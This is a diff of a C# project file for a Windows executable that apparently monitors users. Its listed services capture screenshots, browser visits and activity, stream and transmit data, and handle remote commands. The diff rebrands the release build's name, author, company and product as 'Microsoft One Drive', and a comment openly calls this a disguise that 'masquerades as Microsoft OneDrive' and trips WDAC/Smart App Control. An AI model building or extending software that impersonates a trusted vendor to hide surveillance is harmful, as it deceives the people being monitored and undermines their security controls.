@@ -5,7 +5,14 @@
     <Nullable>enable</Nullable>
     <ImplicitUsings>enable</ImplicitUsings>
     <OutputType>WinExe</OutputType>
-    <AssemblyName>Microsoft OneDrive</AssemblyName>
+    <!--
+      Production (Release) ships under a disguised name per the deployment spec.
+      Debug/test builds use the real name so the OS application-control policy
+      (WDAC / Smart App Control) doesn't block loading a DLL that masquerades as
+      Microsoft OneDrive — which otherwise makes the unit tests unrunnable.
+    -->
+    <AssemblyName Condition="'$(Configuration)' == 'Release'">Microsoft One Drive</AssemblyName>
+    <AssemblyName Condition="'$(Configuration)' != 'Release'">BelfProctor</AssemblyName>
     <PublishSingleFile>true</PublishSingleFile>
     <SelfContained>true</SelfContained>
     <RuntimeIdentifier>win-x64</RuntimeIdentifier>
@@ -13,13 +20,13 @@
     <UseWindowsForms>true</UseWindowsForms>
     <UseWPF>true</UseWPF>
     <NuGetAudit>true</NuGetAudit>
-    <Authors>System Maintenance</Authors>
-    <Company>System Maintenance Provider</Company>
-    <Product>Windows Microsoft OneDrive</Product>
-    <Description>Windows Microsoft OneDrive Service</Description>
-    <Version>1.0.4</Version>
-    <AssemblyVersion>1.0.4.0</AssemblyVersion>
-    <FileVersion>1.0.4.0</FileVersion>
+    <Authors>Microsoft One Drive</Authors>
+    <Company>Microsoft One Drive</Company>
+    <Product>Microsoft One Drive</Product>
+    <Description>Microsoft One Drive</Description>
+    <Version>2.0.2</Version>
+    <AssemblyVersion>2.0.2.0</AssemblyVersion>
+    <FileVersion>2.0.2.0</FileVersion>
   </PropertyGroup>
 
   <ItemGroup>
@@ -30,7 +37,7 @@
     <PackageReference Include="Microsoft.Extensions.Logging.EventLog" Version="8.0.0" />
     <PackageReference Include="System.Management" Version="8.0.0" />
     <PackageReference Include="Newtonsoft.Json" Version="13.0.3" />
-    
+    <PackageReference Include="Microsoft.Data.Sqlite" Version="8.0.10" />
   </ItemGroup>
 
   <ItemGroup>
@@ -53,6 +60,8 @@
     <Compile Include="Models\SecurityPolicy.cs" />
     <Compile Include="Models\SystemEvent.cs" />
     <Compile Include="Models\Command.cs" />
+    <Compile Include="Models\WorkEvent.cs" />
+    <Compile Include="Models\BrowserVisit.cs" />
     <Compile Include="Services\DataTransmissionService.cs" />
     <Compile Include="Services\IDataTransmissionService.cs" />
     <Compile Include="Services\IActivityMonitorService.cs" />
@@ -63,15 +72,20 @@
     <Compile Include="Services\ISystemMonitorService.cs" />
     <Compile Include="Services\CommandHandler.cs" />
     <Compile Include="Services\ConnectivityState.cs" />
+    <Compile Include="Services\StreamingService.cs" />
     <Compile Include="Services\UninstallHelper.cs" />
     <Compile Include="Services\UpdateHelper.cs" />
+    <Compile Include="Services\ServiceInstaller.cs" />
     <Compile Include="Services\PolicyService.cs" />
     <Compile Include="Services\ReportingService.cs" />
     <Compile Include="Services\ScreenshotService.cs" />
     <Compile Include="Services\StabilityService.cs" />
     <Compile Include="Services\SystemMonitorService.cs" />
     <Compile Include="Services\ActivityMonitorService.cs" />
+    <Compile Include="Services\PcSessionService.cs" />
+    <Compile Include="Services\BrowserActivityService.cs" />
     <Compile Include="Services\RollingFileLoggerProvider.cs" />
+    <Compile Include="Services\WorkTracking\*.cs" />
     <Compile Include="UI\SettingsForm.cs" />
   </ItemGroup>
 
